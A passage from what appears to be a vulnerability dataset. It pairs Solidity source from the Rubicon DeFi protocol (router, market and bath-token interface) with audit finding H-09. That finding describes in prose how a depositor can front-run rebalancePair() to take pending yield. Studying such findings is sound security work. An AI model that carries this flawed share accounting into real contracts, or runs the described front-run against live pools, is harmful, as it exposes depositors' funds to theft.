newBathTokenImplementation,\n            proxyManager,\n            _initData\n        );\n\n        // New Bath Token Address\n        newBathTokenAddress = address(newBathToken);\n\n        // Write to source-of-truth router mapping for this ERC-20 => Bath Token\n        tokenToBathToken[_underlyingERC20] = newBathTokenAddress;\n\n        // Log Data\n        emit LogNewBathToken(\n            _underlyingERC20,\n            newBathTokenAddress,\n            _feeAdmin,\n            block.timestamp,\n            msg.sender\n        );\n    }\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Benjamin Hughes - Rubicon\n/// @notice This contract is a router to interact with the low-level functions present in RubiconMarket and Pools\npragma solidity =0.7.6;\npragma abicoder v2;\n\nimport \"./RubiconMarket.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"./peripheral_contracts/WETH9.sol\"; // @unsupported: ovm\nimport \"./interfaces/IBathToken.sol\";\n\n///@dev this contract is a high-level router that utilizes Rubicon smart contracts to provide\n///@dev added convenience and functionality when interacting with the Rubicon protocol\ncontract RubiconRouter {\n    using SafeMath for uint256;\n\n    address public RubiconMarketAddress;\n\n    address payable public wethAddress;\n\n    bool public started;\n\n    event LogNote(string, uint256);\n\n    event LogSwap(\n        uint256 inputAmount,\n        address inputERC20,\n        uint256 hurdleBuyAmtMin,\n        address targetERC20,\n        bytes32 indexed pair,\n        uint256 realizedFill,\n        address recipient\n    );\n\n    receive() external payable {}\n\n    fallback() external payable {}\n\n    function startErUp(address _theTrap, address payable _weth) external {\n        require(!started);\n        RubiconMarketAddress = _theTrap;\n        wethAddress = _weth;\n        started = true;\n    }\n\n    /// @notice Get the outstanding best N orders from both sides of the order book for a given pair\n    /// @dev The asset/quote pair ordering will affect return values - asset should be the top of the pair: for example, (ETH, USDC, 10) will return (10 best ETH asks, 10 best USDC bids, 10)\n    /// @param asset the ERC20 token that represents the ask/sell side of the order book\n    /// @param quote the ERC20 token that represents the bid/buy side of the order book\n    /// @param topNOrders the depth of the order book the caller would like to query/view for the asset-quote pair\n    /// @dev \"best\" orders are determined by proximity to the midpoint of the pair. Closest to the midpoint is best order.\n    /// @return Fixed arrays (of topNOrders length) in \"best\" order (returned asks/bids[0] is best and asks/bids[topNOrders] is worst) of asks and bids + topNOrders. Each offer array item is: [pay, buy, offerId]\n    function getBookFromPair(\n        ERC20 asset,\n        ERC20 quote,\n        uint256 topNOrders\n    )\n        public\n        view\n        returns (\n            uint256[3][] memory,\n            uint256[3][] memory,\n            uint256\n        )\n    {\n        uint256[3][] memory asks = new uint256[3][](topNOrders);\n        uint256[3][] memory bids = new uint256[3][](topNOrders);\n        address _RubiconMarketAddress = RubiconMarketAddress;\n\n        //1. Get best offer for each asset\n        uint256 bestAskID = RubiconMarket(_RubiconMarketAddress).getBestOffer(\n            asset,\n            quote\n        );\n        uint256 bestBidID = RubiconMarket(_RubiconMarketAddress).getBestOffer(\n            quote,\n            asset\n        );\n\n        uint256 lastBid = 0;\n        uint256 lastAsk = 0;\n        //2. Iterate from that offer down the book until topNOrders\n        for (uint256 index = 0; index < topNOrders; index++) {\n            if (index == 0) {\n                lastAsk = bestAskID;\n                lastBid = bestBidID;\n\n                (\n                    uint256 _ask_pay_amt,\n                    ,\n                    uint256 _ask_buy_amt,\n\n                ) = RubiconMarket(_RubiconMarketAddress).getOffer(bestAskID);\n                (\n                    uint256 _bid_pay_amt,\n                    ,\n                    uint256 _bid_buy_amt,\n\n                ) = RubiconMarket(_RubiconMarketAddress).getOffer(bestBidID);\n                asks[index] = [_ask_pay_amt, _ask_buy_amt, bestAskID];\n                bids[index] = [_bid_pay_amt, _bid_buy_amt, bestBidID];\n                continue;\n            }\n            uint256 nextBestAsk = RubiconMarket(_RubiconMarketAddress)\n            .getWorseOffer(lastAsk);\n            uint256 nextBestBid = RubiconMarket(_RubiconMarketAddress)\n            .getWorseOffer(lastBid);\n            (uint256 ask_pay_amt, , uint256 ask_buy_amt, ) = RubiconMarket(\n                _RubiconMarketAddress\n            ).getOffer(nextBestAsk);\n            (uint256 bid_pay_amt, , uint256 bid_buy_amt, ) = RubiconMarket(\n                _RubiconMarketAddress\n            ).getOffer(nextBestBid);\n\n            asks[index] = [ask_pay_amt, ask_buy_amt, nextBestAsk];\n            bids[index] = [bid_pay_amt, bid_buy_amt, nextBestBid];\n            // bids[index] = nextBestBid;\n            lastBid = nextBestBid;\n            lastAsk = nextBestAsk;\n        }\n\n        //3. Return those topNOrders for either side of the order book\n        return (asks, bids, topNOrders);\n    }\n\n    /// @dev this function returns the best offer for a pair's id and info\n    function getBestOfferAndInfo(address asset, address quote)\n        public\n        view\n        returns (\n            uint256, //id\n            uint256,\n            ERC20,\n            uint256,\n            ERC20\n        )\n    {\n        address _market = RubiconMarketAddress;\n        uint256 offer = RubiconMarket(_market).getBestOffer(\n            ERC20(asset),\n            ERC20(quote)\n        );\n        (\n            uint256 pay_amt,\n            ERC20 pay_gem,\n            uint256 buy_amt,\n            ERC20 buy_gem\n        ) = RubiconMarket(_market).getOffer(offer);\n        return (offer, pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    // function for infinite approvals of Rubicon Market\n    function approveAssetOnMarket(address toApprove) public {\n        // Approve exchange\n        ERC20(toApprove).approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @dev this function takes the same parameters of swap and returns the expected amount\n    function getExpectedSwapFill(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS //20\n    ) public view returns (uint256 fill_amt) {\n        address _market = RubiconMarketAddress;\n        uint256 currentAmount = 0;\n        for (uint256 i = 0; i < route.length - 1; i++) {\n            (address input, address output) = (route[i], route[i + 1]);\n            uint256 _pay = i == 0\n                ? pay_amt\n                : (\n                    currentAmount.sub(\n                        currentAmount.mul(expectedMarketFeeBPS).div(10000)\n                    )\n                );\n            uint256 wouldBeFillAmount = RubiconMarket(_market).getBuyAmount(\n                ERC20(output),\n                ERC20(input),\n                _pay\n            );\n            currentAmount = wouldBeFillAmount;\n        }\n        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n\n        // Return the wouldbe resulting swap amount\n        return (currentAmount);\n    }\n\n    /// @dev This function lets a user swap from route[0] -> route[last] at some minimum expected rate\n    /// @dev pay_amt - amount to be swapped away from msg.sender of *first address in path*\n    /// @dev buy_amt_min - target minimum received of *last address in path*\n    function swap(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS //20\n    ) public returns (uint256) {\n        //**User must approve this contract first**\n        //transfer needed amount here first\n        ERC20(route[0]).transferFrom(\n            msg.sender,\n            address(this),\n            pay_amt.add(pay_amt.mul(expectedMarketFeeBPS).div(10000)) // Account for expected fee\n        );\n        return\n            _swap(\n                pay_amt,\n                buy_amt_min,\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n    // Internal function requires that ERC20s are here before execution\n    function _swap(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS,\n        address to // Recipient of swap outputs!\n    ) internal returns (uint256) {\n        address _market = RubiconMarketAddress;\n        uint256 currentAmount = 0;\n        for (uint256 i = 0; i < route.length - 1; i++) {\n            (address input, address output) = (route[i], route[i + 1]);\n            uint256 _pay = i == 0\n                ? pay_amt\n                : (\n                    currentAmount.sub(\n                        currentAmount.mul(expectedMarketFeeBPS).div(10000)\n                    )\n                );\n            if (ERC20(input).allowance(address(this), _market) == 0) {\n                approveAssetOnMarket(input);\n            }\n            uint256 fillAmount = RubiconMarket(_market).sellAllAmount(\n                ERC20(input),\n                _pay,\n                ERC20(output),\n                0 //naively assume no fill_amt here for loop purposes?\n            );\n            currentAmount = fillAmount;\n        }\n        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n\n        // send tokens back to sender if not keeping here\n        if (to != address(this)) {\n            ERC20(route[route.length - 1]).transfer(to, currentAmount);\n        }\n\n        emit LogSwap(\n            pay_amt,\n            route[0],\n            buy_amt_min,\n            route[route.length - 1],\n            keccak256(abi.encodePacked(route[0], route[route.length - 1])),\n            currentAmount,\n            to\n        );\n        return currentAmount;\n    }\n\n    /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust\n    function swapEntireBalance(\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external returns (uint256) {\n        //swaps msg.sender entire balance in the trade\n        uint256 maxAmount = ERC20(route[0]).balanceOf(msg.sender);\n        ERC20(route[0]).transferFrom(\n            msg.sender,\n            address(this),\n            maxAmount // Account for expected fee\n        );\n        return\n            _swap(\n                maxAmount,\n                maxAmount.sub(buy_amt_min.mul(expectedMarketFeeBPS).div(10000)), //account for fee\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n    /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust\n    function maxBuyAllAmount(\n        ERC20 buy_gem,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill) {\n        //swaps msg.sender's entire balance in the trade\n        uint256 maxAmount = ERC20(buy_gem).balanceOf(msg.sender);\n        fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n            buy_gem,\n            maxAmount,\n            pay_gem,\n            max_fill_amount\n        );\n        ERC20(buy_gem).transfer(msg.sender, fill);\n    }\n\n    /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust\n    function maxSellAllAmount(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill) {\n        //swaps msg.sender entire balance in the trade\n        uint256 maxAmount = ERC20(buy_gem).balanceOf(msg.sender);\n        fill = RubiconMarket(RubiconMarketAddress).sellAllAmount(\n            pay_gem,\n            maxAmount,\n            buy_gem,\n            min_fill_amount\n        );\n        ERC20(buy_gem).transfer(msg.sender, fill);\n    }\n\n    // ** Native ETH Wrapper Functions **\n    /// @dev WETH wrapper functions to obfuscate WETH complexities from ETH holders\n    function buyAllAmountWithETH(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        uint256 max_fill_amount,\n        uint256 expectedMarketFeeBPS\n    ) external payable returns (uint256 fill) {\n        address _weth = address(wethAddress);\n        uint256 _before = ERC20(_weth).balanceOf(address(this));\n        uint256 max_fill_withFee = max_fill_amount.add(\n            max_fill_amount.mul(expectedMarketFeeBPS).div(10000)\n        );\n        require(\n            msg.value >= max_fill_withFee,\n            \"must send as much ETH as max_fill_withFee\"\n        );\n        WETH9(wethAddress).deposit{value: max_fill_withFee}(); // Pay with native ETH -> WETH\n        // An amount in WETH\n        fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n            buy_gem,\n            buy_amt,\n            ERC20(wethAddress),\n            max_fill_amount\n        );\n        ERC20(buy_gem).transfer(msg.sender, buy_amt);\n\n        uint256 _after = ERC20(_weth).balanceOf(address(this));\n        uint256 delta = _after - _before;\n\n        // Return unspent coins to sender\n        if (delta > 0) {\n            WETH9(wethAddress).withdraw(delta);\n            msg.sender.transfer(delta);\n        }\n    }\n\n    // Paying ERC20 to buy native ETH\n    function buyAllAmountForETH(\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill) {\n        ERC20(pay_gem).transferFrom(msg.sender, address(this), max_fill_amount); //transfer pay here\n        fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n            ERC20(wethAddress),\n            buy_amt,\n            pay_gem,\n            max_fill_amount\n        );\n        WETH9(wethAddress).withdraw(buy_amt); // Fill in WETH\n        msg.sender.transfer(buy_amt); // Return native ETH\n        // Return unspent coins to sender\n        if (max_fill_amount > fill) {\n            ERC20(pay_gem).transfer(msg.sender, max_fill_amount - fill);\n        }\n        return fill;\n    }\n\n    // Pay in native ETH\n    function offerWithETH(\n        uint256 pay_amt, //maker (ask) sell how much\n        // ERC20 nativeETH, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external payable returns (uint256) {\n        require(\n            msg.value >= pay_amt,\n            \"didnt send enough native ETH for WETH offer\"\n        );\n        uint256 _before = ERC20(buy_gem).balanceOf(address(this));\n        WETH9(wethAddress).deposit{value: pay_amt}();\n        uint256 id = RubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            ERC20(wethAddress),\n            buy_amt,\n            buy_gem,\n            pos\n        );\n        uint256 _after = ERC20(buy_gem).balanceOf(address(this));\n        if (_after > _before) {\n            //return any potential fill amount on the offer\n            ERC20(buy_gem).transfer(msg.sender, _after - _before);\n        }\n        return id;\n    }\n\n    // Pay in native ETH\n    function offerForETH(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        // ERC20 nativeETH, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external returns (uint256) {\n        ERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n\n        uint256 _before = ERC20(wethAddress).balanceOf(address(this));\n        uint256 id = RubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            ERC20(wethAddress),\n            pos\n        );\n        uint256 _after = ERC20(wethAddress).balanceOf(address(this));\n        if (_after > _before) {\n            //return any potential fill amount on the offer as native ETH\n            uint256 delta = _after - _before;\n            WETH9(wethAddress).withdraw(delta);\n            msg.sender.transfer(delta);\n        }\n        return id;\n    }\n\n    // Cancel an offer made in WETH\n    function cancelForETH(uint256 id) external returns (bool outcome) {\n        (uint256 pay_amt, ERC20 pay_gem, , ) = RubiconMarket(\n            RubiconMarketAddress\n        ).getOffer(id);\n        require(\n            address(pay_gem) == wethAddress,\n            \"trying to cancel a non WETH order\"\n        );\n        // Cancel order and receive WETH here in amount of pay_amt\n        outcome = RubiconMarket(RubiconMarketAddress).cancel(id);\n        WETH9(wethAddress).withdraw(pay_amt);\n        msg.sender.transfer(pay_amt);\n    }\n\n    // Deposit native ETH -> WETH pool\n    function depositWithETH(uint256 amount, address targetPool)\n        external\n        payable\n        returns (uint256 newShares)\n    {\n        IERC20 target = IBathToken(targetPool).underlyingToken();\n        require(target == ERC20(wethAddress), \"target pool not weth pool\");\n        require(msg.value >= amount, \"didnt send enough eth\");\n\n        if (target.allowance(address(this), targetPool) == 0) {\n            target.approve(targetPool, amount);\n        }\n\n        WETH9(wethAddress).deposit{value: amount}();\n        newShares = IBathToken(targetPool).deposit(amount);\n        //Send back bathTokens to sender\n        ERC20(targetPool).transfer(msg.sender, newShares);\n    }\n\n    // Withdraw native ETH <- WETH pool\n    function withdrawForETH(uint256 shares, address targetPool)\n        external\n        payable\n        returns (uint256 withdrawnWETH)\n    {\n        IERC20 target = IBathToken(targetPool).underlyingToken();\n        require(target == ERC20(wethAddress), \"target pool not weth pool\");\n        require(\n            IBathToken(targetPool).balanceOf(msg.sender) >= shares,\n            \"don't own enough shares\"\n        );\n        IBathToken(targetPool).transferFrom(msg.sender, address(this), shares);\n        withdrawnWETH = IBathToken(targetPool).withdraw(shares);\n        WETH9(wethAddress).withdraw(withdrawnWETH);\n\n        //Send back withdrawn native eth to sender\n        msg.sender.transfer(withdrawnWETH);\n    }\n\n    function swapWithETH(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external payable returns (uint256) {\n        require(route[0] == wethAddress, \"Initial value in path not WETH\");\n        uint256 amtWithFee = pay_amt.add(\n            pay_amt.mul(expectedMarketFeeBPS).div(10000)\n        );\n        require(\n            msg.value >= amtWithFee,\n            \"must send enough native ETH to pay as weth and account for fee\"\n        );\n        WETH9(wethAddress).deposit{value: amtWithFee}();\n        return\n            _swap(\n                pay_amt,\n                buy_amt_min,\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n    function swapForETH(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external payable returns (uint256 fill) {\n        require(\n            route[route.length - 1] == wethAddress,\n            \"target of swap is not WETH\"\n        );\n        //Transfer tokens here first and account for fee\n        require(\n            ERC20(route[0]).transferFrom(\n                msg.sender,\n                address(this),\n                pay_amt.add(pay_amt.mul(expectedMarketFeeBPS).div(10000))\n            ),\n            \"initial ERC20 transfer failed\"\n        );\n        fill = _swap(\n            pay_amt,\n            buy_amt_min,\n            route,\n            expectedMarketFeeBPS,\n            address(this)\n        );\n\n        WETH9(wethAddress).withdraw(fill);\n        // msg.sender.transfer(fill);\n        msg.sender.transfer(fill);\n    }\n}\n\n\n",
        "CodeNames": [
            "IBathToken.sol",
            "RubiconMarket.sol",
            "BathPair.sol",
            "BathHouse.sol",
            "RubiconRouter.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-09",
                "Location": [
                    "//solidity\nfunction underlyingBalance() public view returns (uint256) {\n    uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n    return _pool.add(outstandingAmount);\n}\n",
                    "//solidity\nfunction removeFilledTradeAmount(uint256 amt) external onlyPair {\n    outstandingAmount = outstandingAmount.sub(amt);\n    emit LogRemoveFilledTradeAmount(\n        IERC20(underlyingToken),\n        amt,\n        underlyingBalance(),\n        outstandingAmount,\n        totalSupply\n    );\n}\n"
                ],
                "Type": "  BathPair.sol#rebalancePair()  can be front run to steal the pending rebalancing amount",
                "Description": "\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L756-L759\n\nsolidity\nfunction underlyingBalance() public view returns (uint256) {\n    uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n    return _pool.add(outstandingAmount);\n}\n\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L294-L303\n\nsolidity\nfunction removeFilledTradeAmount(uint256 amt) external onlyPair {\n    outstandingAmount = outstandingAmount.sub(amt);\n    emit LogRemoveFilledTradeAmount(\n        IERC20(underlyingToken),\n        amt,\n        underlyingBalance(),\n        outstandingAmount,\n        totalSupply\n    );\n}\n\n\nFor BathToken, there will be non-underlyingToken assets sitting on the contract that have filled to the contract and are awaiting rebalancing by strategists.\n\nWe assume the rebalance will happen periodically, between one rebalance to the next rebalance, underlyingBalance() will decrease over time as the orders get filled, so that the price per share will get lower while the actual equity remain relatively stable. This kind of price deviation will later be corrected by rebalancing.\n\nEvery time a BathPair.sol#rebalancePair() get called, there will be a surge of price per share for the BathToken, as a certain amount of underlyingToken will be transferred into the contract.\n\nThis enables a well known attack vector, which allows the pending yields to be stolen by front run the strategist's BathPair.sol#rebalancePair() transaction, deposit and take a large share of the vault, and withdraw() right after the rebalancePair() transaction for instant profit.\n\n\nGiven:\n\n*   Current underlyingBalance() is 100,000 USDC;\n*   Pending rebalancing amount is 1000 USDC;\n\n1.  strategist calls rebalancePair();\n2.  The attacker sends a deposit tx with a higher gas price to deposit 100,000 USDC, take 50% share of the pool;\n3.  After the transaction in step 1 is mined, the attacker calls withdraw() and retireve 100,500 USDC.\n\nAs a result, the attacker has stolen half of the pending yields in about 1 block of time.\n\n",
                "Repair": "\nConsider adding a new variable to track rebalancingAmount on BathToken.\n\nBathToken should be notified for any pending rebalancing amount changes via BathPair in order to avoid sudden surge of pricePerShare over rebalancePair().\n\nrebalancingAmount should be considered as part of underlyingBalance().\n\nbghughes (Rubicon) disputed and marked as duplicate(https://github.com/code-423n4/2022-05-rubicon-findings/issues/337#issuecomment-1146422021):\n  Bad issue due to #344(https://github.com/code-423n4/2022-05-rubicon-findings/issues/344) #43(https://github.com/code-423n4/2022-05-rubicon-findings/issues/43) #74(https://github.com/code-423n4/2022-05-rubicon-findings/issues/74)\n\nHickupHH3 (judge) commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/337#issuecomment-1163819406):\n  It's kinda like the flip side to #341(https://github.com/code-423n4/2022-05-rubicon-findings/issues/341), where an incoming deposit benefits by frontrunning.\n \n #221(https://github.com/code-423n4/2022-05-rubicon-findings/issues/221) briefly mentions it: \"Similar problem also affect the deposit function since it relies on the proper accounting of the underlying balance or outstanding amount too. The amount of BathToken (e.g. BathWETH) that depositer received might affected.\"\n \n In this case, a depositor can execute the frontrun attack vector exists even if the strategist is actively rebalancing.  Hence, the high severity rating is justified.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity >=0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface IBathToken is IERC20 {\n    function removeFilledTradeAmount(uint256 amt) external;\n\n    function cancel(uint256 id, uint256 amt) external;\n\n    function placeOffer(\n        uint256 pay_amt,\n        IERC20 pay_gem,\n        uint256 buy_amt,\n        IERC20 buy_gem\n    ) external returns (uint256);\n\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance,\n        uint256 stratTakeProportion,\n        uint256 rebalAmt\n    ) external;\n\n    // Note: commenting out assuming that delegatecalls to the target will suffice, maybe needed for v0 migration ease of upgradeability... trying it out\n    // function initialize(\n    //     IERC20 token,\n    //     address market,\n    //     address _bathHouse,\n    //     address _feeTo\n    // ) external;\n\n    function approveMarket() external;\n\n    function underlyingToken() external returns (IERC20 erc20);\n\n    function bathHouse() external returns (address admin);\n\n    function setBathHouse(address newBathHouse) external;\n\n    function setMarket(address newRubiconMarket) external;\n\n    function setBonusToken(address newBonusToken) external;\n\n    function setFeeBPS(uint256 _feeBPS) external;\n\n    function setFeeTo(address _feeTo) external;\n\n    function RubiconMarketAddress() external returns (address market);\n\n    function outstandingAmount() external returns (uint256 amount);\n\n    function underlyingBalance() external view returns (uint256);\n\n    function deposit(uint256 amount) external returns (uint256 shares);\n\n    function deposit(uint256 assets, address receiver)\n        external\n        returns (uint256 shares);\n\n    function withdraw(uint256 shares) external returns (uint256 amount);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\n\n/// SPDX-License-Identifier: Apache-2.0\n/// This contract is a derivative work of the open-source work of Oasis DEX: https://github.com/OasisDEX/oasis\n\n/// @title RubiconMarket.sol\n/// @notice Please see the repository for this code at https://github.com/RubiconDeFi/rubicon-protocol-v1;\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/// @notice DSAuth events for authentication schema\ncontract DSAuthEvents {\n    event LogSetAuthority(address indexed authority);\n    event LogSetOwner(address indexed owner);\n}\n\n/// @notice DSAuth library for setting owner of the contract\n/// @dev Provides the auth modifier for authenticated function calls\ncontract DSAuth is DSAuthEvents {\n    address public owner;\n\n    function setOwner(address owner_) external auth {\n        owner = owner_;\n        emit LogSetOwner(owner);\n    }\n\n    modifier auth() {\n        require(isAuthorized(msg.sender), \"ds-auth-unauthorized\");\n        _;\n    }\n\n    function isAuthorized(address src) internal view returns (bool) {\n        if (src == address(this)) {\n            return true;\n        } else if (src == owner) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n/// @notice DSMath library for safe math without integer overflow/underflow\ncontract DSMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x <= y ? x : y;\n    }\n\n    function max(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x >= y ? x : y;\n    }\n\n    function imin(int256 x, int256 y) internal pure returns (int256 z) {\n        return x <= y ? x : y;\n    }\n\n    function imax(int256 x, int256 y) internal pure returns (int256 z) {\n        return x >= y ? x : y;\n    }\n\n    uint256 constant WAD = 10**18;\n    uint256 constant RAY = 10**27;\n\n    function wmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), WAD / 2) / WAD;\n    }\n\n    function rmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), RAY / 2) / RAY;\n    }\n\n    function wdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, WAD), y / 2) / y;\n    }\n\n    function rdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, RAY), y / 2) / y;\n    }\n}\n\n// /// @notice ERC-20 interface as derived from EIP-20\n// contract ERC20 {\n//     function totalSupply() public view returns (uint256);\n\n//     function balanceOf(address guy) public view returns (uint256);\n\n//     function allowance(address src, address guy) public view returns (uint256);\n\n//     function approve(address guy, uint256 wad) public returns (bool);\n\n//     function transfer(address dst, uint256 wad) public returns (bool);\n\n//     function transferFrom(\n//         address src,\n//         address dst,\n//         uint256 wad\n//     ) public returns (bool);\n// }\n\n/// @notice Events contract for logging trade activity on Rubicon Market\n/// @dev Provides the key event logs that are used in all core functionality of exchanging on the Rubicon Market\ncontract EventfulMarket {\n    event LogItemUpdate(uint256 id);\n    event LogTrade(\n        uint256 pay_amt,\n        address indexed pay_gem,\n        uint256 buy_amt,\n        address indexed buy_gem\n    );\n\n    event LogMake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogBump(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogTake(\n        bytes32 id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        address indexed taker,\n        uint128 take_amt,\n        uint128 give_amt,\n        uint64 timestamp\n    );\n\n    event LogKill(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogInt(string lol, uint256 input);\n\n    event FeeTake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        ERC20 asset,\n        address indexed taker,\n        address feeTo,\n        uint256 feeAmt,\n        uint64 timestamp\n    );\n\n    event OfferDeleted(uint256 id);\n}\n\n/// @notice Core trading logic for ERC-20 pairs, an orderbook, and transacting of tokens\n/// @dev This contract holds the core ERC-20 / ERC-20 offer, buy, and cancel logic\ncontract SimpleMarket is EventfulMarket, DSMath {\n    uint256 public last_offer_id;\n\n    /// @dev The mapping that makes up the core orderbook of the exchange\n    mapping(uint256 => OfferInfo) public offers;\n\n    bool locked;\n\n    /// @dev This parameter is in basis points\n    uint256 internal feeBPS;\n\n    /// @dev This parameter provides the address to which fees are sent\n    address internal feeTo;\n\n    struct OfferInfo {\n        uint256 pay_amt;\n        ERC20 pay_gem;\n        uint256 buy_amt;\n        ERC20 buy_gem;\n        address owner;\n        uint64 timestamp;\n    }\n\n    /// @notice Modifier that insures an order exists and is properly in the orderbook\n    modifier can_buy(uint256 id) virtual {\n        require(isActive(id));\n        _;\n    }\n\n    /// @notice Modifier that checks the user to make sure they own the offer and its valid before they attempt to cancel it\n    modifier can_cancel(uint256 id) virtual {\n        require(isActive(id));\n        require(getOwner(id) == msg.sender);\n        _;\n    }\n\n    modifier can_offer() virtual {\n        _;\n    }\n\n    modifier synchronized() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function isActive(uint256 id) public view returns (bool active) {\n        return offers[id].timestamp > 0;\n    }\n\n    function getOwner(uint256 id) public view returns (address owner) {\n        return offers[id].owner;\n    }\n\n    function getOffer(uint256 id)\n        public\n        view\n        returns (\n            uint256,\n            ERC20,\n            uint256,\n            ERC20\n        )\n    {\n        OfferInfo memory _offer = offers[id];\n        return (_offer.pay_amt, _offer.pay_gem, _offer.buy_amt, _offer.buy_gem);\n    }\n\n    /// @notice Below are the main public entrypoints\n\n    function bump(bytes32 id_) external can_buy(uint256(id_)) {\n        uint256 id = uint256(id_);\n        emit LogBump(\n            id_,\n            keccak256(abi.encodePacked(offers[id].pay_gem, offers[id].buy_gem)),\n            offers[id].owner,\n            offers[id].pay_gem,\n            offers[id].buy_gem,\n            uint128(offers[id].pay_amt),\n            uint128(offers[id].buy_amt),\n            offers[id].timestamp\n        );\n    }\n\n    /// @notice Accept a given `quantity` of an offer. Transfers funds from caller/taker to offer maker, and from market to caller/taker.\n    /// @notice The fee for taker trades is paid in this function.\n    function buy(uint256 id, uint256 quantity)\n        public\n        virtual\n        can_buy(id)\n        synchronized\n        returns (bool)\n    {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / 